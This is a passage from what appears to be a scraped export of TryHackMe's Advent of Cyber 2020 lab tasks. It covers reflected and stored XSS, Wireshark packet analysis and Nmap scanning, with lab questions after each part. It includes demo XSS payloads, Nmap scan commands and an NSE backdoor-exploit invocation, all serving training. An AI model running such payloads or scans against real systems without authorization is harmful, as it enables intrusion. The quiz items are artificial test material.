example:</p>\n<pre><code>&lt;img src=\'LINK\' onmouseover="alert(\'xss\')"&gt;\n</code></pre>\n<p>In this case, an attacker embeds an image that is going to execute <code>alert(\'xss\')</code> if the user\'s mouse goes over it.</p>\n<p>Say we have a web application that allows users to post their comments under the post.</p>\n<p><img src="https://i.imgur.com/Z5sYzsM.png" alt="https://i.imgur.com/Z5sYzsM.png" /></p>\n<p>An attacker can exploit this by putting an XSS payload instead of their comments and force everyone to execute a custom javascript code.<br />\nThis is what happens if we use the above <code>&lt;img&gt;</code> payload there:</p>\n<p><img src="https://i.imgur.com/3t16xkO.png" alt="https://i.imgur.com/3t16xkO.png" /></p>\n<p>A malicious picture executes a custom <code>alert(\'xss\')</code> once being viewed. This is the most common example of stored XSS.</p>\n<hr />\n<p>Reflected is another type of XSS that is carried out directly in the HTTP request and requires the attacker to do a bit more work. An example of this could be malicious javascript in the link or a search field. The code is not stored on the server directly, meaning that a target user should compromise himself by clicking the link.</p>\n<p>Here\'s a quick example of an URL with malicious javascript included:</p>\n<pre><code>&lt;https://somewebsite.com/titlepage?id=&gt; &lt;script&gt; evilcode() &lt;/script&gt;\n</code></pre>\n<p>Any user that clicks on the link is going to execute the <code>evilcode()</code> function, eventually falling under the XSS attack.</p>\n<p>Let\'s say a website is using a\xa0query string <strong>keyword</strong> in its URL <code>10.10.100.27/reflected?keyword=hello</code> like so:</p>\n<p><img src="https://i.imgur.com/n2EFUFY.png" alt="https://i.imgur.com/n2EFUFY.png" /></p>\n<p>A search query is put after this keyword parameter. The XSS can be exploited by putting a payload <strong>instead</strong> of the search query.<br />\nThe url starts with <code>10.10.100.27/reflected?keyword=</code>. By adding text onto the keyword, we can perform reflected XSS like <code>10.10.100.27/reflected?keyword=&lt;script&gt;alert(1)&lt;/script&gt;</code>\xa0which results in an alert box with 1 on our screen.</p>\n<p><img src="https://i.imgur.com/GloKxur.png" alt="https://i.imgur.com/GloKxur.png" /><br />\nBingo! The XSS was successfully exploited!</p>\n<h2>How to detect XSS?</h2>\n<p>Both reflected and stored XSS vulnerabilities can be detected in a similar way: through the use of HTML tags, such as <code>&lt;h1&gt;&lt;/h1&gt;</code>, <code>&lt;b&gt;&lt;/b&gt;</code> or others. The idea is to try out inputting text with those tags and see if that produces any differences. Any change in text size or color immediately indicates an XSS vulnerability.</p>\n<p>But sometimes, it might be challenging to find them manually, and of course, we cannot forget about the basic human error. Happily, there\'s a solution for that! OWASP ZAP is an open-source web application security scanner. It can automatically detect web vulnerabilities.<br />\nYou can launch ZAP by going to \'Applications -&gt; Web -&gt; Owasp Zap\' on the attack box:<br />\n<img src="https://i.imgur.com/LxZC8gc.png" alt /></p>\n<p>You\'ll see a fairly simple interface upon the launch.<br />\n<img src="https://i.imgur.com/RiPVvNz.png" alt style="width:100%" /></p>\n<p>On the right, you can see a button titled \'Automated scan\'. Click it and it\'ll take you to the attack configuration page.<br />\n<img src="https://i.imgur.com/6lQYLjq.png" alt /></p>\n<p>Now, simply put the target URL in the \'URL to attack\' field and press \'Attack\'!<br />\nAfter some time, all the vulnerabilities will be displayed in the \'Alerts\' tab:<br />\n<img src="https://i.imgur.com/XTrmwY7.png" alt /><br />\n<br /></p>\n<h2>Bonus: Mitigating XSS</h2>\n<p>The rule is simple: <strong>all</strong> user input should be sanitized at both the client and server-side so that potentially malicious characters are removed. There are libraries to help with this on every platform.<br />\nSmart developers should always implement a filter to any text input field and follow a strict set of rules regarding processing the inputted data. For more info about this, check out OWASP\'s guide:</p>\n<p><a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Input_Validation_Cheat_Sheet.md">OWASP/CheatSheetSeries</a></p>\n<h2>Challenge</h2>\n<ul>\n<li><strong>Please allow more time for this VM to deploy (more than the usual 5 minutes) if you are non-subscriber.</strong></li>\n</ul>\n<h2>Resources</h2>\n<p>Check out this awesome guide about XSS:\xa0<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection">swisskyrepo/PayloadsAllTheThings</a><br />\nCommon payload list for you to try out:\xa0<a href="https://github.com/payloadbox/xss-payload-list">payloadbox/xss-payload-list</a><br />\nFor more OWASP Zap guides, check out the following room: <a href="https://tryhackme.com/room/learnowaspzap">Learn OWASP Zap</a></p>\n', 'taskType': 'vm', 'taskNo': 8, 'taskCreated': '2020-11-12T02:47:44.496Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '5fb7f4add249c0446cafcfb7', 'questions': [{'questionNo': 1, 'question': '<p>Deploy your AttackBox (the blue "Start AttackBox" button) and the tasks machine (green button on this task) if you haven\'t already. Once both have deployed, open Firefox on the AttackBox and copy/paste the machines IP (<a href="http://MACHINE_IP:5000">http://MACHINE_IP:5000</a>) into the browser search bar (<em>the webserver is running on port 5000, so make sure this is included in your web requests</em>).</p>\n', 'hint': ''}, {'questionNo': 2, 'question': '<p>What vulnerability type was used to exploit the application?</p>\n', 'hint': ''}, {'questionNo': 3, 'question': '<p>What query string can be abused to craft a reflected XSS?</p>\n', 'hint': 'If you\'re unsure, on the "Make a wish" website search for something and see what query string is added in your browser search bar. '}, {'questionNo': 4, 'question': '<p>Launch the OWASP ZAP Application</p>\n', 'hint': ''}, {'questionNo': 5, 'question': '<p>Run a ZAP (zaproxy) automated scan on the target. How many XSS alerts are in the scan?</p>\n', 'hint': ''}, {'questionNo': 6, 'question': '<p>Explore the XSS alerts that ZAP has identified, are you able to make an alert appear on the "Make a wish" website?</p>\n', 'hint': ''}]}, {'taskTitle': '[Day 7] <span class="badge badge-soft-warning size-16">Networking</span> The Grinch Really Did Steal Christmas', 'taskDesc': '<h3><a href="https://www.youtube.com/watch?v=yZTPMoYY2CA">Watch DarkStar\'s Video On Solving This Task</a></h3>\n<p><img src="https://static.javatpoint.com/tutorial/wireshark/images/wireshark-tutorial.png" alt /><br />\n<a href="https://static.javatpoint.com/tutorial/wireshark/images/wireshark-tutorial.png">(Javatpoint., 2018)</a></p>\n<h2>Story</h2>\n<p>It\'s 6 AM and Elf McSkidy is clocking-in to The Best Festival Company\'s SOC headquarters to begin his watch over TBFC\'s infrastructure. After logging in, Elf McEager proceeds to read through emails left by Elf McSkidy during the nightshift.</p>\n<p>More automatic scanning alerts, oh look, another APT group. It feels like it\'s going to be a long, but easy start to the week for Elf McEager.</p>\n<p>Whilst clearing the backlog of emails, Elf McEager reads the following: "<strong>URGENT:</strong> Data exfiltration detected on TBFC-WEB-01". "<em>Uh oh</em>" goes Elf McEager. "<em>TBFC-WEB-01? That\'s Santa\'s webserver! Who has the motive to steal data from there?!</em>". It\'s time for the ever-vigilant Elf McEager to prove his salt and find out exactly what happened.</p>\n<p>Unknowingly to Elf McEager, Elf McSkidy made this all up! Fortunately, this isn\'t a real attack - but a training exercise created ahead of Elf McEager\'s performance review.</p>\n<h2>Learning Objectives</h2>\n<ul>\n<li>What are IP Addresses &amp; how are they assigned.</li>\n<li>Understanding TCP/IP and UDP\n<ul>\n<li>3-way handshake</li>\n</ul>\n</li>\n<li>Wireshark Crash Course (where is it used and why)\n<ul>\n<li>Basic Filtering and operators</li>\n</ul>\n</li>\n<li>Analysing our first few PCAPS\n<ul>\n<li>HTTP</li>\n<li>SMB</li>\n</ul>\n</li>\n<li>Challenge</li>\n</ul>\n<p>Made with ❤ by <a href="https://tryhackme.com/p/cmnatic">CMNatic</a></p>\n<hr />\n<h2>What is an IP Address?</h2>\n<p>You\'ll hear talk of the term "IP address" frequently throughout the information technology field - not just TryHackMe. Short for an <strong>I</strong>nternet <strong>P</strong>rotocol address, I like to explain this fundamental of networking using the same way that a postal/mail system works in real life.</p>\n<p>When sending a letter, you must provide the address for where the letter should go, and it is best practice to include your address as the return address in case the letter is lost (or you wish to let the recipient know how to reply). An IP address serves the same purpose but for devices connected to a network! Devices connected to the internet will have two of these addresses -a public and a private address. Think of a private address as the name of the recipient at a business i.e. Joe Smith, and the public address being the location of this business i.e. 160 Kemp Road, London.</p>\n<p>Let\'s say you are accessing the Internet through your computer. Your computer will be a part of two networks, and in turn, will use both public and private IP address:<br />\n<br /></p>\n<ul>\n<li>A private IP address to identify itself amongst other devices (such as smartphones, TV\'s and other computers) within the network of your house. In the screenshot below, the two devices have the following private IP address:</li>\n</ul>\n<p><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-8/1.png" alt="https://assets.tryhackme.com/additional/cmn-aoc2020/day-8/1.png" /></p>\n<table>\n<thead>\n<tr>\n<th>Device Name</th>\n<th>IP Address</th>\n<th>IP Address Type</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>DESKTOP-KJE57FD</td>\n<td>192.168.1.77</td>\n<td>Private</td>\n</tr>\n<tr>\n<td>CMNatic-PC</td>\n<td>192.168.1.74</td>\n<td>Private</td>\n</tr>\n</tbody>\n</table>\n<p><br /><br />\nTryHackMe similarly uses these private addresses. For you to access other TryHackMe devices such as the instances that you deploy in this room, you will need to be on the same private network as these instances are not connected to the internet. This is why you must use a client such as OpenVPN to connect to the network.</p>\n<p>MuirlandOracle explains how these private IP addresses work in his Intro to Networking room.<br />\n<br /></p>\n<ul>\n<li>A public IP address was given by your Internet Service Provider (ISP) that identifies your house on the Internet (the Internet is just many, many networks connected). Using our example from above, the two devices will share a public IP address to identify themselves on the Internet:</li>\n</ul>\n<p><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-8/2.png" alt="https://assets.tryhackme.com/additional/cmn-aoc2020/day-8/2.png" /></p>\n<table>\n<thead>\n<tr>\n<th>Device Name</th>\n<th>IP Address</th>\n<th>IP Address Type</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>DESKTOP-KJE57FD</td>\n<td>86.157.52.21</td>\n<td>Public</td>\n</tr>\n<tr>\n<td>CMNatic-PC</td>\n<td>86.157.52.21</td>\n<td>Public</td>\n</tr>\n</tbody>\n</table>\n<p>This is achieved through <a href="https://techterms.com/definition/nat">NATting</a>, however, detailing how this works exactly this works is a bit beyond the scope of today.<br />\n<br /></p>\n<h2>Protocols 101</h2>\n<p>With the internet predicted to have 50 billion devices connected by the end of 2020 (<a href="https://www.cisco.com/c/dam/en_us/about/ac79/docs/innov/IoT_IBSG_0411FINAL.pdf">https://www.cisco.com/c/dam/en_us/about/ac79/docs/innov/IoT_IBSG_0411FINAL.pdf</a>), chaos quickly ensues if there are no ground-rules in how devices should communicate with each other.</p>\n<p><br /><br />\nIf this is a bit confusing - I don\'t blame you, just bear with me here. Think of it this way: You use protocols in everyday life! When talking to someone, you will both use the same set of protocols...otherwise, no one will understand each other. At the very least, all parties wishing to converse will use the same language - this is a protocol! Other protocols may also include the context or topic of the conversation. If anyone strays from these protocols - they risk not being understood! This is the same for network-connected devices.</p>\n<ul>\n<li>Back to the technical stuff...</li>\n</ul>\n<p>Enter protocols such as the TCP/IP &amp; UDP/IP models. With TCP/IP being the most common-place today, we\'ll discuss this further. TCP/IP is a protocol that ensures that any data sent is processed in the same order. Going back to our postal system, your letter will go to many places - even when sending domestically. Your computer traffic does the same, going from device to device in a process called routing. One device could deliver data quicker (and a result, in a different order) then another causing a headache for the situation where accuracy is important such as the following:<br />\n<br /></p>\n<ul>\n<li>Downloading files</li>\n<li>Visiting a website in your browser</li>\n<li>Sending emails</li>\n</ul>\n<p>This is unlike the UDP protocol where having all packets is not quite as important (making the protocol a lot quicker than TCP/IP) which is why applications like video streaming make use of UDP (i.e. Skype). We don\'t really care if a few packets are lost as we can still see a majority of the picture.<br />\n<br /></p>\n<h2>How does TCP/IP send data? The Three-Way Handshake:</h2>\n<p>The three-way handshake is the method that makes TCP reliable. Any data that is sent is given a random number sequence and is reconstructed using this number sequence and incrementing by 1. Both computers must agree on the same number sequence for data to be sent in the correct order. This order is agreed upon during three steps.</p>\n<p>In the diagram below, "Client" has the initial sequence number (ISN) of "0" where the "Server" has "5,000". Any data sent from "Client" and received on "Server" will be initial sequence + 1. If this is the first packet from "Client" this would be "0 + 1". I\'ve shown three packets being sent from "Client" in the table below to help demonstrate this:</p>\n<table>\n<thead>\n<tr>\n<th>Device</th>\n<th>Initial Sequence Number (IN)</th>\n<th>Final Sequence Number</th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Client (Sender)</td>\n<td>0</td>\n<td>0 + 1 = 1</td>\n<td></td>\n</tr>\n<tr>\n<td>Client (Sender)</td>\n<td>1</td>\n<td>1 + 1 = 2</td>\n<td></td>\n</tr>\n<tr>\n<td>Client (Sender)</td>\n<td>2</td>\n<td>2 + 1 = 3</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<p><img src="https://www.open.edu/openlearncreate/pluginfile.php/258370/mod_oucontent/oucontent/35227/9b0bce6c/594a9486/cn_black_fig3.jpg" alt="https://www.open.edu/openlearncreate/pluginfile.php/258370/mod_oucontent/oucontent/35227/9b0bce6c/594a9486/cn_black_fig3.jpg" /><br />\n<br /></p>\n<ol>\n<li>SYN - Client: Here\'s my initial number sequence (ISN) to <strong>SYN</strong>chronise with (0)</li>\n<li>SYN/ACK - Server: Here my Initial Number Sequence (ISN) to <strong>SYN</strong>chronise with (5,000) and I <strong>ACK</strong>nowledge your initial number sequence (0)</li>\n<li>ACK - Client: I <strong>ACK</strong>nowledge your Initial Number Sequence (ISN) of (5,000) here is some data that is my ISN+1</li>\n</ol>\n<p>When the data is received, it is reassembled by the receiver. Let\'s show the conditions of which reassembly is required:</p>\n<h2>Examples of TCP reassembling data:</h2>\n<h3>No reassembly required:</h3>\n<p>If the "Server" were to receive data that was received in the exact order it was sent from "Client":<br />\n<br /></p>\n<ol>\n<li>Sent 1st - Received 1st</li>\n<li>Sent 2nd - Received 2nd</li>\n<li>Sent 3rd - Received 3rd</li>\n</ol>\n<p>Then no reassembly is needed as the data is received in the exact order it was sent.<br />\n<br /></p>\n<h3>Reassembly required:</h3>\n<p>For example, if the "Server" was to receive all the data, but in a different order then what was sent, reassembly is required:<br />\n<br /></p>\n<ol>\n<li>Sent 1st - Received 1st</li>\n<li>Sent 2nd - Received 3rd</li>\n<li>Sent 3rd - Received 2nd</li>\n</ol>\n<p>Because all data is received, just in a different order, it can be reassembled using the agreed sequence numbers that would have been exchanged during the three-way-handshake.<br />\n<br /></p>\n<h3>The connection is dropped:</h3>\n<p>If the "Client" was to send <strong>three</strong> packets, but the "Server" only receives <strong>two</strong>\xa0out of three packets, they are disconnected from each other as the data sent is corrupt:<br />\n<br /></p>\n<ol>\n<li>Sent 1st - Received 1st</li>\n<li>Sent 2nd - Not received</li>\n<li>Sent 3rd - Received 2nd</li>\n</ol>\n<p>The data will not be processed by "Server" as the packet that was sent 2nd by the "Client" was never received by the "Server"#2, meaning there was a loss of data along the way.<br />\n<br /></p>\n<h2>Crash Course in Monitoring Network Traffic:</h2>\n<p>Being able to capture exactly what is travelling across a network and understanding this is an important skill in information technology. From diagnosing to capturing credentials, positions in IT ranging from system administrators to digital forensics and us pentesters all use network traffic in their own ways. For example, since data sent via HTTP or FTP is unencrypted, a pentester might be able to capture usernames and passwords being entered into a website.<br />\n<br /></p>\n<h2>Introducing Wireshark:</h2>\n<p>Wireshark is capable of recording a log of all the packets sent and received on a computer\'s network adapter. For example, we can see how a computer (highlighted in red) connected to a computer (highlighted in black) that was running a web server via HTTP, in this case, it was the web page: web_server/download.HTML, which we can export and view for ourselves:</p>\n<p><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-8/4.png" alt="https://assets.tryhackme.com/additional/cmn-aoc2020/day-8/4.png" /></p>\n<p><br /><br />\n<img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-8/5.png" alt="https://assets.tryhackme.com/additional/cmn-aoc2020/day-8/5.png" /></p>\n<p>Networks are, however, rather noisy...Wireshark captured 2,648 packets after a single minute on my machine. This makes analysing very hard. Thankfully, we can use filters to narrow down the results. We can filter by many things, but we\'ll only cover a couple of important ones in the table below. Note that all the examples below use the <code>==</code> operator to see if the filter <strong>exactly</strong> matches the value we give it.</p>\n<table>\n<thead>\n<tr>\n<th>Filter</th>\n<th>Description</th>\n<th>Example</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>ip.src</td>\n<td>Show all packets that originate from the specified IP address</td>\n<td><code>ip.src == 192.168.1.1</code></td>\n</tr>\n<tr>\n<td>ip.dst</td>\n<td>Show all packets that are destined to the specified IP address</td>\n<td><code>ip.dst == 192.168.1.1</code></td>\n</tr>\n<tr>\n<td>tcp/udp.port</td>\n<td>Show all packets that are sent via the protocol and port specified</td>\n<td><code>tcp.port == 22 / udp.port == 67</code></td>\n</tr>\n<tr>\n<td>protocol.request.method</td>\n<td>Show all packets that use a specific method of the protocol given. For example, HTTP allows for both a <code>GET</code> and <code>POST</code> to retrieve and submit data accordingly.</td>\n<td><code>http.request.method == GET / POST</code></td>\n</tr>\n</tbody>\n</table>\n<p>In the screenshot below, I used the filter <code>ip.src</code> to list all the packets that were explicitly sent from a specific address, using the <code>==</code> operator to define what host I wish to search for (<code>145.254.160.237</code>). We\'ll quickly explore the use of these operators in the next section.</p>\n<p><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-8/6.png" alt="https://assets.tryhackme.com/additional/cmn-aoc2020/day-8/6.png" /><br />\n<br /></p>\n<h2>Combining Filters With Operators</h2>\n<table>\n<thead>\n<tr>\n<th>Operator</th>\n<th>Description</th>\n<th>Example</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>==</td>\n<td>You\'d use this operator to check if the filter exactly matches the value given in all packets</td>\n<td><code>ip.addr == 192.168.1.1</code> will show all packets with the IP address <code>192.168.1.1</code> (this could be source or destination)</td>\n</tr>\n<tr>\n<td>!=</td>\n<td>This operator checks if the filter does not match the value given in all packets</td>\n<td><code>ip.addr != 192.168.1.10</code> will show all packetsthat does not include the IP address <code>192.168.1.10</code> (this could be source or destination)</td>\n</tr>\n<tr>\n<td>&amp;&amp;</td>\n<td>Use this operator to combine multiple filters together.</td>\n<td>For example, to show all packets associated with two different IP addresses <code>ip.addr == 192.168.1.1 &amp;&amp; ip.addr == 192.168.1.10</code> will only show packets with the source or destination IP addresses of <code>192.168.1.1</code> or <code>192.168.1.10</code></td>\n</tr>\n</tbody>\n</table>\n<h2>Exporting data from Wireshark:</h2>\n<p>As previously shown, Wireshark is capable of exporting data from protocols such as HTTP by navigating to "File → Export Objects" and selecting the protocol available. In the screenshots below, we are listing objects that can be exported from the file-sharing SMB protocol.</p>\n<p><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-8/7.png" alt="https://assets.tryhackme.com/additional/cmn-aoc2020/day-8/7.png" /></p>\n<p><br /><br />\nWe\'ll export the "test.txt" file onto our device.</p>\n<p><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-8/8.png" alt="https://assets.tryhackme.com/additional/cmn-aoc2020/day-8/8.png" style="width:100%" /></p>\n<p>As highlighted below:<br />\n<img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-8/9.png" alt="https://assets.tryhackme.com/additional/cmn-aoc2020/day-8/9.png" /><br />\n<br /></p>\n<h2>Challenge</h2>\n<p>Download the ZIP file "aocpcaps.zip" that is attached to this task, use a combination of the filters and features of Wireshark we\'ve covered to answer the questions below:</p>\n', 'taskType': 'downloadable', 'taskNo': 9, 'taskCreated': '2020-11-12T02:47:57.517Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '5fc54cf8a379f32bc0ce4e03', 'questions': [{'questionNo': 1, 'question': '<p>Open "pcap1.pcap" in Wireshark. What is the IP address that initiates an ICMP/ping?</p>\n', 'hint': ''}, {'questionNo': 2, 'question': '<p>If we only wanted to see HTTP GET requests in our "pcap1.pcap" file, what filter would we use?</p>\n', 'hint': "We've demonstrated filtering a web server within the task"}, {'questionNo': 3, 'question': '<p>Now apply this filter to "pcap1.pcap" in Wireshark, what is the name of the article that the IP address "<strong>10.10.67.199</strong>" visited?</p>\n', 'hint': '/posts/'}, {'questionNo': 4, 'question': '<p>Let\'s begin analysing "pcap2.pcap". Look at the captured FTP traffic; what password was leaked during the login process?</p>\n<p>There\'s a lot of irrelevant data here - Using a filter here would be useful!</p>\n', 'hint': 'As FTP uses the TCP protocol and runs on port 21, we\'d use the "tcp.port" filter and "==" operator to only show all data that is TCP and uses port 21. \n\nThe filter we would use: is "tcp.port == 21"'}, {'questionNo': 5, 'question': '<p>Continuing with our analysis of "pcap2.pcap", what is the name of the protocol that is encrypted?</p>\n', 'hint': ''}, {'questionNo': 6, 'question': '<p>Analyse "pcap3.pcap" and recover Christmas!</p>\n<p>What is on Elf McSkidy\'s wishlist that will be used to replace Elf McEager?</p>\n', 'hint': "There's a lot of data! Only a tiny part of it is useful - use filters!\n\nHow would you export files?"}]}, {'taskTitle': '[Day 8] <span class="badge badge-soft-warning size-16">Networking</span> What\'s Under the Christmas Tree?', 'taskDesc': '<h3><a href="https://www.youtube.com/watch?v=StmtQKoFiWg">Watch DarkStar\'s Video On Solving This Task</a></h3>\n<p><br /><br />\n<span><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-9/makefg.png" alt /></span><br />\n<br /></p>\n<h1>Day 8: What\'s Under the Christmas Tree? - Story:</h1>\n<p>After a few months of probation, intern Elf McEager has passed with glowing feedback from Elf McSkidy. During the meeting, Elf McEager asked for more access to <em>The Best Festival Company\'s (TBFC\'s)</em> internal network as he wishes to know more about the systems he has sworn to protect.</p>\n<p>Elf McSkidy was reluctant to agree. However, after Elf McEager\'s heroic actions in recovering Christmas, Elf McSkidy soon thought this was a good idea. This was uncharted territory for Elf McEager - he had no idea how to begin finding out this information for his new responsibilities. Thankfully, TBFC has a wonderful up-skill program covering the use of Nmap for ElfMcEager to enrol in.<br />\n<br /></p>\n<h2><strong>8.1. Getting Started:</strong></h2>\n<p>Before we begin, we\'re going to need to deploy two Instances:</p>\n<ol>\n<li>The THM AttackBox by pressing the "<strong>Start AttackBox</strong>" button at the top-right of the page.</li>\n<li>The vulnerable Instance attached to this task by pressing the "<strong>Deploy</strong>" button at the top-right of this task/day.</li>\n</ol>\n<h2><strong>8.2. Today\'s Learning Objectives:</strong></h2>\n<p>We\'re going to be exploring the use of Nmap in our information gathering stage to build a picture of the services running on a remote computer, and to understand how these may be useful to use. We\'ll also be showing how Nmap scans can be detected and blocked by the use of firewalls.</p>\n<p>Made with ❤ by <a href="https://tryhackme.com/p/cmnatic">CMNatic</a></p>\n<hr />\n<h2><strong>8.3. Intro to Nmap:</strong></h2>\n<p>An open-source, extensible, and importantly free tool, Nmap is one of the industry standard\'s that everyone should have in their toolkit. Nmap is capable of a few things that are essential in the Information Gathering stages of a penetration testing methodology such as the <a href="http://www.pentest-standard.org/index.php/Main_Page">Penetration Testing Execution Standard</a> (PTES), including:</p>\n<ul>\n<li>Host discovery</li>\n<li>Vulnerability discovery</li>\n<li>Service/Application discovery</li>\n</ul>\n<h2><strong>8.4. Basic Nmap Functionality</strong></h2>\n<p>We\'ll quickly glaze over the basics of getting started with Nmap, the scan types, and the syntax for these types accordingly. We\'ll apply our networking knowledge learned yesterday in "Day 7 - The Grinch Really Did Steal Christmas" to help understand the differences between TCP and UDP scanning.<br />\n<br /></p>\n<h3><strong>8.4.1 TCP Scanning</strong></h3>\n<p>There are two common TCP scan types that you\'ll be using in Nmap. On the surface they seem to perform the same thing, however, they\'re very different. Before we break this down, let\'s illustrate TCP/IP\'s three-way-handshake again and\xa0recap the three stages of a "normal" three-way-handshake:</p>\n<ol>\n<li>SYN</li>\n<li>SYN/ACK</li>\n<li>ACK</li>\n</ol>\n<p><span><img src="https://www.open.edu/openlearncreate/pluginfile.php/258370/mod_oucontent/oucontent/35227/9b0bce6c/594a9486/cn_black_fig3.jpg" alt /></span><br />\n<em><a href="https://www.open.edu/openlearncreate/pluginfile.php/258370/mod_oucontent/oucontent/35227/9b0bce6c/594a9486/cn_black_fig3.jpg"><em>(The Open University., N.D)</em></a></em></p>\n<ul>\n<li>Connect Scan - <code>nmap -sT &lt;ip&gt;</code></li>\n<li>SYN Scan - <code>nmap -sS &lt;ip&gt;</code></li>\n</ul>\n<h4>8.4.1.1 SYN Scan:</h4>\n<p>The most favourable type of scan, Nmap uses the TCP SYN scan (<code>-sS</code>) if the scan is run with both administrative privileges and a different type isn\'t provided. Unlike a connect scan, this scan type doesn\'t fulfil the "three-way-handshake" as what would normally take place. Instead, after the "SYN/ACK" is received from the remote host, a "RST" packet is sent by the host that we are scanning from (never completing the connection).</p>\n<p>This scan type is the most favourable method as Nmap can use all the information gathered throughout the handshake to determine port status based on the response that is given by the IP address that is being scanned:</p>\n<ul>\n<li>SYN/ACK = open</li>\n<li>RST = Closed</li>\n<li>Multiple attempts = filtered</li>\n</ul>\n<p>Not only this but also since fewer packets are sent across a network, there is less likelihood of being detected.<br />\n<br /></p>\n<h4>8.4.1.2. Connect Scan:</h4>\n<p>Unlike a SYN scan, administrative privileges aren\'t required for this scan to run. This is as a result of Nmap using the <em>Berkeley Sockets API</em>\xa0which has quickly formed to be the standard method of how services like web applications communicate with an operating system. As a result of more packets being sent by Nmap, this scan is easier to detect and takes a longer time to complete. Moreover, as the "three-way-handshake" completes as if it were a normal connection, it can be logged a lot more conveniently.<br />\n<br /></p>\n<h2>8.5. Nmap Timing Templates</h2>\n<p>Nmap allows the user to determine Nmap\'s performance. Measured in aggressiveness, a user can use one of six profiles [0 to 5] to change the rate at which Nmap scans at. With <code>-T0</code> being the stealthiest, this profile scans one port every 5 minutes, whereas <code>-T5</code> is considered both the most aggressive and potential to be inaccurate. This is because the <code>-T5</code> waits a mere 0.3 seconds for the remote device to respond to a handshake. Factors such as those listed below determine how accurate these scans are:</p>\n<ul>\n<li>The resource usage a remote server is under. The higher usage, the slower it is to send a response to Nmap.</li>\n<li>The quality of the connection. If you have a slow or unstable connection, you are likely to miss responses if you are sending many packets at once.</li>\n</ul>\n<p>Generally speaking, you will want to use low-aggressive profiles for real-world scenarios, however, in a lab environment where noise doesn\'t matter - high-aggressive profiles prove to be the quickest. For perspective, Nmap uses <code>-T3</code> if no profile is provided. In a pentesting situation, you\'d be inclined to use a lower value such as within in a lab environment, a higher value<code>-T4</code> will suffice as stealth is not as critical.<br />\n<br /></p>\n<h2><strong>8.6. An Introduction to Nmap\'s Scripting Engine</strong></h2>\n<p>A recent addition to Nmap is the\xa0<strong>N</strong>map\xa0<strong>S</strong>cripting\xa0<strong>E</strong>ngine or NSE for short. This feature introduces a "plug-in" nature to Nmap, where scripts can be used to automate various actions such as:</p>\n<ul>\n<li>Exploitation</li>\n<li>Fuzzing</li>\n<li>Bruteforcing</li>\n</ul>\n<p>At the time of writing, the NSE comes with 603 scripts, which can be found <a href="https://nmap.org/nsedoc/scripts/">here.</a></p>\n<p><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-9/nsedoc.png" alt="nsedoc" style="width:100%" /><br />\n<em>Nmaps NSE Documentation Page</em></p>\n<p>Take for example the\xa0<a href="https://nmap.org/nsedoc/scripts/ftp-proftpd-backdoor.html">FTP ProFTPD Backdoor</a> script. This script attempts to exploit an FTP service that is running ProFTPD version 1.3.3c, the version of which is fingerprinted by Nmap itself.</p>\n<p>We can provide the script that we want to use by using the <code>--script</code> flag in Nmap like so:<code>nmap --script ftp-proftpd-backdoor -p 21 &lt;ip_address&gt;</code><br />\n<br /></p>\n<h2><strong>8.7. Additional\xa0Scan Types:</strong></h2>\n<p>Not only can we use the Nmap\'s TCP Scan, but Nmap also boasts a combination of these types for various actions that are useful to us during the information gathering stage. I have assorted these into the table below, giving a brief explanation of their purpose.</p>\n<p>(Where x.x.x.x == MACHINE_IP )</p>\n<table>\n<thead>\n<tr>\n<th>Flag</th>\n<th>Usage Example</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>-A</td>\n<td><code>nmap -A x.x.x.x</code></td>\n<td>Scan the host to identify services running by matching against Nmap\'s database with OS detection</td>\n</tr>\n<tr>\n<td>-O</td>\n<td><code>nmap -O x.x.x.x</code></td>\n<td>Scan the host to retrieve and perform OS detection</td>\n</tr>\n<tr>\n<td>-p</td>\n<td><code>nmap -p 22 x.x.x.x</code></td>\n<td>Scan a specific port number on the host. A range of ports can also be provided (i.e. 10-100) by using the first and last value of the range like so: <code>nmap -p 10-100 x.x.x.x</code></td>\n</tr>\n<tr>\n<td>-p-</td>\n<td><code>nmap -p- x.x.x.x</code></td>\n<td>Scan all ports (0-65535) on the host</td>\n</tr>\n<tr>\n<td>-sV</td>\n<td><code>nmap -sV\xa0x.x.x.x</code></td>\n<td>Scan the host using TCP and perform version fingerprinting</td>\n</tr>\n</tbody>\n</table>\n<h2><strong>8.8. Defending against Nmap Scans</strong></h2>\n<p>The practice of security through obscurity doesn\'t work here. Whilst it may seem logical to attempt to hide a service by changing its port number to something other than the standard (such as changing SSH from port 22 to 2222), the service will still be fingerprinted during an Nmap scan (albeit slightly later on). Unfortunately, you cannot get the best of both worlds in having a service available yet hidden.</p>\n<p>Fortunately, open-source <strong>I</strong>ntrusion <strong>D</strong>etection (IDS) &amp; <strong>P</strong>revention <strong>S</strong>ystems (IPS) such as <a href="https://www.snort.org/">Snort</a> and <a href="https://suricata-ids.org/">Suricata</a> allows blue-teamers to protect their networks using network monitoring. For example, you would install these services on firewalls such as <a href="https://www.pfsense.org/">pfSense</a>:<br />\n<span><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-9/pfsense_dash.png" alt style="width:100%" /></span><br />\n<span><em>The dashboard of a pfSense Firewall.</em></span></p>\n<p>Rulesets such as the <a href="https://rules.emergingthreats.net/">emerging threats</a> for Snort and Suricata are capable of detecting and blocking a wide variety of potentially malicious traffic - including:</p>\n<ul>\n<li>Malware traffic</li>\n<li>Reverse shells</li>\n<li>Metasploit payloads</li>\n<li>Nmap scans</li>\n</ul>\n<p><span><img 